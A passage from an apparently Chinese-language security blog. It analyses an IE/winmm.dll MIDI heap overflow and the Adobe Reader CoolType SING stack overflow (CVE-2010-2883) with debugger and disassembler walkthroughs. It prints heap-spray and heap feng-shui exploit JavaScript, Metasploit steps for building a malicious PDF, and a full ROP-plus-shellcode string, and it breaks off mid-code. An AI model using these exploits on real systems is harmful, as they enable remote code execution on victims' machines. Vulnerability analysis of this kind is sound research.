<li>htc：堆尾检查，在堆块末尾附加额外的标记信息（通常为 8 字节），用于检査堆块是否发生溢出。</li>
<li>hfc：堆释放检查，在释放堆块时对堆进行各种检査，防止多次释放同一个堆块。</li>
<li>hpc：堆参数检査，对传递给堆管理的参数进行更多的检查。</li>
<li>ust：用户态栈回湖，即将每次调用堆函数的函数调用信息记录到一个数据库中。</li>
<li>htg：堆标志，为堆块增加附加标记，以记录堆块的使用情况或其他信息。</li>
<li>hvc：调用时验证，即每次调用堆函数时都对整个堆进行验证和检査</li>
<li>hpa：启用页堆，在堆块后增加专门用于检测溢出的栅栏页，若发生堆溢出触及栅栏页便会立刻触发异常。</li>
</ul>
</li>
<li><p>堆尾检查</p>
<ul>
<li>在每个堆块的尾部添加 8 字节内容，若该数据被破坏就说明可能存在堆溢出。</li>
<li>要检测尾部数据是否被破坏，还需要开启堆参数检查hpc 或堆释放检查hfe</li>
<li>用调试器直接打开目标进程，而非附加方式（附加方式无法在堆尾添加额外信息，也就无法进行堆尾检查）</li>
<li>开启堆尾检查和堆参数检査：<code>!gflag +htc +hpc</code></li>
</ul>
</li>
<li><p>页堆机制</p>
<ul>
<li>调试漏洞时，需要定位到导致漏洞的代码</li>
<li>堆尾检査方式主要是堆被破坏后的场景，不利于定位导致漏洞的代码。</li>
<li>开启页堆机制后，堆管理器会在堆块中增加不可访问的栅栏页，当溢出覆盖到栅栏页时就立即触发异常</li>
</ul>
</li>
</ul>
<h1 id="05-漏洞成因"><a href="#05-漏洞成因" class="headerlink" title="05-漏洞成因"></a>05-漏洞成因</h1><p>基于导图推算的漏洞分析方法</p>
<ol start="0">
<li><p>为方便调试：gflags.exe开启页堆、关闭OD的”忽略异常“相关选项</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080659.jpg" alt="image-20200122115206448"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080645.jpg" alt="image-20200122115227100"></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080641.jpg" alt="image-20200122115245944"></p>
</li>
<li><p>OD附加IE浏览器，拖入/打开exploit.html，产生访问异常，此处便是崩溃点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080642.jpg" alt="image-20200122115410646"></p>
</li>
<li><p>IDA中打开目标模块winmm.dll（需加载相应的符号文件），找到崩溃点所在地址，F5查看伪C代码，得知引起崩溃的是v25（对其解引用造成的）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080637.jpg" alt="image-20200122115649819"></p>
</li>
<li><p>借助IDA中伪C代码，对v25变量进行追溯，最终找到参数a1（在线绘图：<a href="https://www.draw.io）" target="_blank" rel="noopener">https://www.draw.io）</a></p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081033.jpg" alt="image-20200124113602071"></p>
</li>
<li><p>仅通过上述各变量间的联系，暂未发现有价值的信息，现对各变量设置条件记录断点，观察各变量值变化如何</p>
<p>找到能够准确反映变量值的位置，如下表所示：</p>
<p>| 变量   | C代码                        | 汇编指令                      | 记录值 | 地址     |<br>| —— | —————————- | —————————– | —— | ——– |<br>| v1     | v2 = <em>(_DWORD </em>)(v1 + 60);   | mov     esi, [edi+3Ch]        | edi    | 76B2D050 |<br>| v2     | v3 = <em>(_DWORD </em>)v2;          | mov     ecx, [esi]            | esi    | 76B2D06D |<br>| v9     | v11 = <em>(_DWORD </em>)(v9 + v37); | mov     ecx, [ebx+eax]        | ebx    | 76B2D0B5 |<br>| V11    | v13 = v11 &amp; 0xFFFFFF;        | and     ecx, 0FFFFFFh         | ecx    | 76B2D0C3 |<br>| V13    | v35 = v13;                   | mov     [ebp+var_8], ecx      | ecx    | 76B2D0D1 |<br>| V20    | v29 = (_BYTE <em>)(v24 + v20);  | lea     edx, [eax+esi]        | esi    | 76B2D248 |<br>| V21    | v36 = v21 &amp; 0xF0;            | and     dl, 0F0h              | dl     | 76B2D1F3 |<br>| V24    | v25 = (char </em>)(v24 + v20);   | add     esi, eax              | eax    | 76B2D21E |<br>| 参数a1 | if ( !<em>(_DWORD </em>)(a1 + 52) ) | cmp    dword ptr [edi+34h], 0 | edi    | 76B2D044 |</p>
</li>
<li><p>ctrl+g到指定的位置，shift+F4下条件记录断点（暂停程序-从不、记录表达数值-永远）</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080651.jpg" alt="image-20200123114834965"></p>
<p> 最终设置的断点如下</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80646.jpg" alt="image-20200123115410150"></p>
</li>
<li><p>ctrl+F2重新运行，alt+L打开日志窗口，得到如下信息：</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081034.jpg" alt="image-20200123115637787"></p>
</li>
<li><p>观察各变量，寻找规律</p>
<ul>
<li>参数a1=v1不变、v2不变</li>
<li>v9递增，增到0x44重新开始</li>
<li>v11=v13</li>
<li>v21等于v11/v13最低位</li>
</ul>
</li>
<li><p>触发访问异常时，v11=v13=0073B29F，v21=9F，由上述MIDI格式所言，0x9n为”打开音符“的音轨类型。</p>
<p> 由此可推断，v11/13为包含参数的音轨事件，v21为具体的音轨事件类型</p>
<p> 打开上述提取到的mid文件，也可证实这一点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080654.jpg" alt="image-20200123122022089"></p>
</li>
<li><p>shift+F2对v11/13下条件断点，当音轨事件为0073B29F时断下，单步跟踪，详细分析</p>
<p> 通过“打开音符”音轨事件计算出偏移0x419，esi中存储的是某基址，基址+偏移后越界，解引用后造成访问异常</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080638.jpg" alt="image-20200123125833593"></p>
</li>
<li><p>继续追踪esi中的基址，IDA中提示为v20局部变量，追根溯源找到参数a1</p>
<p>v20来自v1：<code>v20 = *(_DWORD *)(v1 + 132);</code></p>
<p>v1来自参数a1：<code>v1 = wParam;</code></p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080703.jpg" alt="image-20200123130305451"></p>
</li>
<li><p>光标移至函数名，右键-jump to xref，查看何处调用此函数，从而找到传的参数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080656.jpg" alt="image-20200124113811423"></p>
<p> 参数wParam来自midiOutPlayNextPolyEvent函数内的局部变量v6，而v6来自gpEmuList</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081036.jpg" alt="image-20200124113918189"></p>
</li>
<li><p>查看gpEmuList的引用情况，看“up”方向，w-写操作的，最终找到mesOpen函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080647.jpg" alt="image-20200124114006619"></p>
<p> mesOpen内部又调用了winmmAlloc函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080652.jpg" alt="image-20200124114129683"></p>
<p> 其正是一个堆空间分配函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080635.jpg" alt="image-20200124114301483"></p>
</li>
<li><p>综上所述，做一下变量等价替换，最终得到：esi指向申请的400字节堆空间</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">esi = v20; </span><br><span class="line">v20 = *(_DWORD *)(v1 + <span class="number">132</span>);</span><br><span class="line">==&gt; esi = *(_DWORD *)(v1 + <span class="number">132</span>);</span><br><span class="line">v1 = wParam = gpEmuList;</span><br><span class="line">==&gt; esi = *(_DWORD *)(gpEmuList + <span class="number">132</span>);</span><br><span class="line">gpEmuList = v5;</span><br><span class="line">==&gt; esi = *(_DWORD *)(v5 + <span class="number">132</span>);</span><br><span class="line">*((_DWORD *)v5 + <span class="number">132</span>) = v6;</span><br><span class="line">==&gt; esi = v6;</span><br><span class="line">v6 = winmmAlloc(<span class="number">0x400</span>u);</span><br><span class="line">==&gt; esi = winmmAlloc(<span class="number">0x400</span>u);</span><br><span class="line">==&gt; esi指向申请的<span class="number">400</span>字节堆空间</span><br></pre></td></tr></table></figure>
</li>
<li><p>至此，就能够清晰的看到漏洞是如何形成的：</p>
<ol>
<li>HeapAlloc函数申请0x400字节的堆空间，将堆基址赋值给esi</li>
<li>程序在处理”打开音符“事件时，计算得到偏移0x419</li>
<li>偏移0x419 &gt; 堆空间大小0x400，最终导致堆块的越界访问，产生漏洞</li>
</ol>
</li>
</ol>
<p>PS：此处之所以将其归为堆溢出，而非数组越界索引，是因为它是向固定堆块大小之外的地方执行写操作，而且不存在索引数组的动作，这与堆溢出类似，所以将该漏洞定性为堆溢出也算合理。（摘自《漏洞战争》</p>
<h1 id="06-漏洞利用"><a href="#06-漏洞利用" class="headerlink" title="06-漏洞利用"></a>06-漏洞利用</h1><ol>
<li><p>从exploit.html中提取出关键js代码，共有三部分</p>
<p> （PS：精简过只留大体框架、堆喷射部分并非本文重点</p>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第一部分：进行堆喷射</span></span><br><span class="line">&lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line"><span class="keyword">var</span> heap_obj = <span class="keyword">new</span> heapLib.ie(<span class="number">0x10000</span>);</span><br><span class="line"><span class="keyword">var</span> code = <span class="built_in">unescape</span>(<span class="string">"xxxxxxxxxxxxxxxx"</span>);</span><br><span class="line"><span class="keyword">var</span> ORF = <span class="string">"%u0c0c%u0c0c"</span>;</span><br><span class="line"><span class="keyword">var</span> nops = <span class="built_in">unescape</span>(ORF);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (nops.length &lt; <span class="number">0x1000</span>) nops+= nops;</span><br><span class="line"><span class="keyword">var</span> shellcode =  nops.substring(<span class="number">0</span>,<span class="number">0x800</span> - code.length) + code;</span><br><span class="line"><span class="keyword">while</span> (shellcode.length &lt; <span class="number">0x40000</span>) shellcode += shellcode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> block = shellcode.substring(<span class="number">0</span>, (<span class="number">0x80000</span><span class="number">-6</span>)/<span class="number">2</span>);</span><br><span class="line">heap_obj.gc();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i &lt; <span class="number">600</span>; i++) &#123;</span><br><span class="line">  heap_obj.alloc(block);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第二部分：漏洞利用的关键部分</span></span><br><span class="line">&lt;script language=<span class="string">'javascript'</span>&gt;</span><br><span class="line"><span class="keyword">var</span> heap = <span class="keyword">new</span> heapLib.ie();</span><br><span class="line"><span class="keyword">var</span> selob = <span class="built_in">document</span>.createElement(<span class="string">"select"</span>)</span><br><span class="line">selob.w0 = <span class="built_in">unescape</span>(<span class="string">"%u0c0c%u0c0c"</span>)</span><br><span class="line">selob.w1 = alert</span><br><span class="line">...</span><br><span class="line">selob.w55 = alert</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> clones = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">feng_shui</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (i &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    clones[i] = selob.cloneNode(<span class="literal">true</span>)</span><br><span class="line">    i = i + <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> j = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> (j &lt; <span class="number">1000</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> clones[j];</span><br><span class="line">    CollectGarbage();</span><br><span class="line">    j  = j + <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">feng_shui();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">trigger</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> k = <span class="number">999</span>;</span><br><span class="line">  <span class="keyword">while</span> (k &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(clones[k].w0) == <span class="string">"string"</span>) &#123;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      clones[k].w0(<span class="string">'come on!'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    k = k - <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  feng_shui();</span><br><span class="line">  <span class="built_in">document</span>.audio.Play();</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
 <figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 第三部分：调用trigger函数，也是关键</span></span><br><span class="line">&lt;script <span class="keyword">for</span>=audio event=PlayStateChange(oldState,newState)&gt;</span><br><span class="line">  <span class="keyword">if</span> (oldState == <span class="number">3</span> &amp;&amp; newState == <span class="number">0</span>) &#123;</span><br><span class="line">    trigger();</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
</li>
<li><p>第二段js代码分析：</p>
<ol>
<li>创建一个 select 元素，并设置 56 个属性：只有 w0 为 String 类型，其余为 Object 类型；</li>
<li>创建一个1000大小的数组 clones</li>
<li>调用feng_shui函数：cloneNode 循环复制selob到数组 clones 中、间隔地释放 clones 数组中的元素</li>
</ol>
</li>
<li><p>每个属性类型的定义，在内存均用不同的数值表示，比如 0x09 代表 Object,0x08 代表 String</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081035.jpg" alt="image-20200124141010461"></p>
</li>
<li><p>找到分配空间与释放空间的地方，以便设置条件记录断点</p>
<p> 分配：CAttrArray::Clone函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080648.jpg" alt="image-20200124124541997"></p>
<p> 释放：CImplAry::Delete函数</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081037.jpg" alt="image-20200124125008678"></p>
</li>
<li><p><strong>漏洞利用思想：1000个元素的数组，经过间隔释放后，会留有许多间隙，当目标程序在处理音轨事件时，会调用winmmAlloc函数来申请堆空间（如上漏洞成因所言），新申请的堆空间会“插空“，刚好占在被释放的元素位置上，这样其左右两侧均是数组元素，若对此堆空间进行操作，使之产生溢出，则会影响两侧的数据，进而控制程序实施恶意操作。</strong></p>
</li>
<li><p>找到申请堆空间的地方，以便获取堆空间地址，如下eax作为函数返回值便是。</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-081030.jpg" alt="image-20200124120452736"></p>
</li>
<li><p>在数组元素分配、释放以及堆空间申请的地方设置条件记录断点，来验证漏洞利用思想是否正确，除此之外，在崩溃点也设置断点（一般断点），以便进行下一步的调试（为避免程序被异常中断，先关闭页堆机制）</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 条件记录断点</span></span><br><span class="line"><span class="number">0x76B2CDEE</span>: 记录eax: 堆空间地址;</span><br><span class="line"><span class="number">0x7E38E80D</span>: 记录[eax+<span class="number">4</span>]; 数组元素分配地址</span><br><span class="line"><span class="number">0x7E279860</span>: 记录[esi+<span class="number">4</span>]; 数组元素释放地址</span><br></pre></td></tr></table></figure>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-80655.jpg" alt="image-20200124134030679"></p>
</li>
<li><p>alt+T查看日志消息，如上所言，新申请的堆空间实现了“插空“（占在刚释放的数组元素上），地址为0x02B174F0</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">地址       消息</span><br><span class="line">...</span><br><span class="line"><span class="number">7E38</span>E80D   COND: Array Alloc = <span class="number">02B</span>174F0</span><br><span class="line">...</span><br><span class="line"><span class="number">7E279860</span>   COND: Array Free = <span class="number">02B</span>174F0</span><br><span class="line">...</span><br><span class="line"><span class="number">76B</span>2CDEE   COND: VulBuffer Alloc = <span class="number">02B</span>174F0</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
</li>
<li><p>到达崩溃点时，esi指向0x08，即w0属性String</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080701.jpg" alt="image-20200124141230272"></p>
</li>
<li><p>后续在处理NoteOn事件时，会将读取的字节+1并重新写入，0x08+1 = 0x09，由string类型变为Object类型，此时其字符串”0x0c0c0c0c”也会作为指针/地址解析（典型的堆喷射地址）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080640.jpg" alt="image-20200124141520627"></p>
</li>
<li><p>第三段js代码分析</p>
<ol>
<li>调用trigger函数</li>
<li>遍历数组元素，若其属性不是String（即Object），则执行<code>clones[k].w0(&#39;come on!&#39;);</code></li>
<li>此语句会调用 CAttrValue::GetIntoVariant 函数</li>
</ol>
</li>
<li><p>属性非String时，会调用CAttrValue::GetIntoVariant 函数，此函数会获取虚表指针、调用虚函数，从而控制程序执行流程</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-81038.jpg" alt="image-20200124143956292"></p>
</li>
<li><p>执行到“获取虚表指针”指令处，虚表指针正是w0的字符串“0x0c0c0c0c”，此时其作为指针解析（堆喷射地址）</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-080700.jpg" alt="image-20200124144402834"></p>
</li>
<li><p>接下来调用虚函数，call地址为0c0c0c0c，进入布置好的堆空间，经过滑块指令到达shellcode，成功执行，漏洞利用成功！</p>
<p><img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-24-81035.jpg" alt="image-20200124144711946"></p>
</li>
</ol>
<h1 id="07-参考文献"><a href="#07-参考文献" class="headerlink" title="07-参考文献"></a>07-参考文献</h1><ul>
<li>《漏洞战争》</li>
</ul>
<p>（祝大家新年快乐、身体健康，希望肺炎疫情赶紧过去！</p>
<p>首发于看雪论坛：<a href="https://bbs.pediy.com/thread-257371.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-257371.htm</a></p>
]]></content>
      <categories>
        <category>软件安全/逆向</category>
      </categories>
      <tags>
        <tag>漏洞分析</tag>
      </tags>
  </entry>
  <entry>
    <title>cve-2010-2883漏洞分析（栈溢出）</title>
    <url>/2020/01/11/reverse/cve-2010-2883%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%EF%BC%88%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%89/</url>
    <content><![CDATA[<p>[TOC]</p>
<h1 id="01-漏洞描述"><a href="#01-漏洞描述" class="headerlink" title="01-漏洞描述"></a>01-漏洞描述</h1><ul>
<li>漏洞战争：Adobe Reader 和 Acrobat中的 Cooltype.dll 库在解析字体文件 SING 表中的 UniqueName项时存在的栈溢出漏洞，用户受骗打开了特制的 PDF 文件就有可能导致执行任意代码</li>
<li><a href="https://cve.mitre.org：Stack-based" target="_blank" rel="noopener">https://cve.mitre.org：Stack-based</a> buffer overflow in CoolType.dll in Adobe Reader and Acrobat 9.x before 9.4, and 8.x before 8.2.5 on Windows and Mac OS X, allows remote attackers to execute arbitrary code or cause a denial of service (application crash) via a PDF document with a long field in a Smart INdependent Glyphlets (SING) table in a TTF font, as exploited in the wild in September 2010.</li>
</ul>
<h1 id="02-测试环境"><a href="#02-测试环境" class="headerlink" title="02-测试环境"></a>02-测试环境</h1><ul>
<li>目标系统：Windows7 专业版（虚拟机</li>
<li>OllyDebug：动态调试</li>
<li>IDA Pro：静态分析</li>
<li>PdfStreamDumper：提取PDF数据</li>
<li>Adobe Reader 9.3.4：漏洞软件</li>
<li>Metasploit：复现漏洞<a id="more"></a></li>
</ul>
<h1 id="03-漏洞复现"><a href="#03-漏洞复现" class="headerlink" title="03-漏洞复现"></a>03-漏洞复现</h1><ol>
<li><p>msf生成恶意文件</p>
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 搜索并使用模块</span></span><br><span class="line">msf5 &gt; search cve-2010-2883</span><br><span class="line">msf5 &gt; use exploit/windows/fileformat/adobe_cooltype_sing</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置payload</span></span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set payload windows/exec</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置参数：弹出计算器</span></span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; set cmd calc.exe</span><br><span class="line"><span class="meta">#</span><span class="bash"> 攻击：生成恶意pdf文件</span></span><br><span class="line">msf5 exploit(windows/fileformat/adobe_cooltype_sing) &gt; exploit</span><br></pre></td></tr></table></figure>
</li>
<li><p>恶意文件复制到目标机，Adobe Reader打开，成功弹出计算器</p>
</li>
<li><p>PS：也可设置payload为强大的meterpreter，获取反弹shell</p>
</li>
</ol>
<h1 id="04-准备工作"><a href="#04-准备工作" class="headerlink" title="04-准备工作"></a>04-准备工作</h1><h2 id="4-1-漏洞定位-基于字符串"><a href="#4-1-漏洞定位-基于字符串" class="headerlink" title="4.1-漏洞定位-基于字符串"></a>4.1-漏洞定位-基于字符串</h2><ol>
<li><p>根据漏洞描述，得关键字符串：“SING”、漏洞所在文件：Cooltype.dll </p>
</li>
<li><p>IDA静态分析：打开Cooltype.dll ，Alt+t搜索“SING”，获得多条记录</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135319.jpg" alt="image-20200109153945146"></p>
</li>
<li><p>依次进入检查是否有敏感代码：记录2地址0803DD74处，发现敏感函数strcat，其在拼接字符串时，若不进行长度检查，则会造成栈溢出，初步断定strcat处为溢出点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135332.jpg" alt="image-20200109154723463"></p>
</li>
<li><p>详细分析溢出点所在函数的代码块（三处关键点</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135312.jpg" alt="image-20200109171058551"></p>
</li>
</ol>
<h2 id="4-2-判定安全机制"><a href="#4-2-判定安全机制" class="headerlink" title="4.2-判定安全机制"></a>4.2-判定安全机制</h2><ul>
<li><p>GS：由IDA中汇编代码分析，函数开始处有安全cookie，因此判定存在GS机制</p>
</li>
<li><p>DEP：数据执行保护，即没有执行权限的内存空间不允许执行代码，这已然成为程序标配</p>
</li>
<li><p>ASLR：地址空间布局随机化，包含映像随机化与堆栈随机化，010Editor打开目标exe，找到相关字段，发现已开启</p>
<p>  <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081312.jpg" alt="image-20200110153747769"></p>
</li>
</ul>
<h2 id="4-3-SING表结构分析"><a href="#4-3-SING表结构分析" class="headerlink" title="4.3-SING表结构分析"></a>4.3-SING表结构分析</h2><ol>
<li><p>PDFStreamDumper打开恶意pdf文件，菜单-Search For-TTF fonts，搜索ttf所在Object，自动跳转到第10个，本Object中，ctrl+f搜索字符串“SING”，如下</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135335.jpg" alt="image-20200109191201941"></p>
</li>
<li><p>TTF中关于SING表的TableEntry（可理解为SING头）结构如下，找到SING表主体所在位置：0000011C</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> sturct_SING</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">char</span> tag[<span class="number">4</span>];<span class="comment">//"SING"</span></span><br><span class="line">    ULONG checkSum;<span class="comment">//校验和</span></span><br><span class="line">    ULONG offset;<span class="comment">//相对文件偏移，0000011C</span></span><br><span class="line">    ULONG length;<span class="comment">//数据长度</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135336.jpg" alt="image-20200109192548467"></p>
</li>
<li><p>SING表结构如下，偏移为0x10处为uniqueName字段处，即上图0x0000012C处</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-09-135327.jpg" alt="image-20200109192803886"></p>
</li>
</ol>
<h2 id="4-4-JS堆喷射代码"><a href="#4-4-JS堆喷射代码" class="headerlink" title="4.4-JS堆喷射代码"></a>4.4-JS堆喷射代码</h2><ol>
<li><p>PDFStreamDumper打开恶意pdf文件，在第一个object处找到OpenAction，表示其在第11个obj中，PDF运行时会执行里面脚本</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081311.jpg" alt="image-20200110150253963"></p>
</li>
<li><p>进入第11个obj，表示执行的js代码位于第12个obj中</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-081310.jpg" alt="image-20200110150415569"></p>
</li>
<li><p>进入12obj，发现实现堆喷射的js脚本</p>
<p> <img src="https://note-1252764528.cos.ap-chengdu.myqcloud.com/2020-01-10-81311.jpg" alt="image-20200110150527026"></p>
</li>
<li><p>目测代码是经过混淆过的，简单整理后获得js代码</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shellcode = <span class="built_in">unescape</span>( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%ud7da%u82ba%ube98%ud9de%u2474%u5ef4%uc931%u31b1%uee83%u31fc%u1456%u5603%u7a96%u224b%uf87e%udbb4%u9d7e%u3e3d%u9d4f%u4a5a%u2dff%u1e28%uc6f3%u8b7c%uab80%ubca8%u0121%uf38f%u3ab2%u92f3%u4130%u7520%u8a09%u7435%uf74e%u24b4%u7307%ud96a%uc92c%u52b7%udf7e%u87bf%ude36%u19ee%ub94d%u9b30%ub182%u8378%ufcc7%u3833%u8a33%ue8c5%u730a%ud569%u86a3%u1173%u7903%u6b06%u0470%ua811%ud20b%u2b94%u91ab%u900f%u754a%u53c9%u3240%u3c9d%uc544%u3772%u4e70%u9875%u14f1%u3c52%uce5a%u65fb%ua106%u7504%u1ee9%ufda1%u4a07%u5fd8%u8d4d%uda6e%u8d23%ue570%ue613%u6e41%u71fc%ua55e%u8eb9%ue414%u06eb%u7cf1%u4aae%uab02%u72ec%u5e81%u808c%u2a99%ucd89%uc61d%u5ee3%ue8c8%u5e50%u8ad9%ucc37%u6281%u74d2%u7b23'</span> );</span><br><span class="line"><span class="keyword">var</span> nop = <span class="built_in">unescape</span>( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (nop.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) </span><br><span class="line">  nop+=nop;</span><br><span class="line">d = nop.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">d += shellcode;</span><br><span class="line">d += nop;</span><br><span class="line">e = d.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(e.length &lt; <span class="number">0x80000</span>) </span><br><span class="line">  e += e;</span><br><span class="line">h = e.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> slide = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;<span class="number">0x1f0</span>;i++) </span><br><span class="line">  slide[i]=h+<span 